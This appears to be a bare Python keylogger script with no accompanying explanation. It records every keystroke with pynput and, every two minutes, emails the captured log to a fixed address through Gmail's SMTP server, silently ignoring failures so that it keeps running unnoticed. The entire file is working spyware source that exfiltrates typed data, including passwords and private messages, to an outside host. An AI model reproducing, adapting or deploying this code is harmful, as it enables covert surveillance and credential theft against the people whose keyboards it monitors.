import pynput.keyboard
import smtplib
import threading

log = ""

def process_key_press(key):
    global log
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    log = log + current_key

def report():
    global log
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "sender@gmail.com"
    receiver_email = "receiver@gmail.com"
    password = "sender_email_password"
    message = "Subject: Key Logs\n\n" + log
    log = ""
    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        server.close()
    except:
        pass
    timer = threading.Timer(120, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
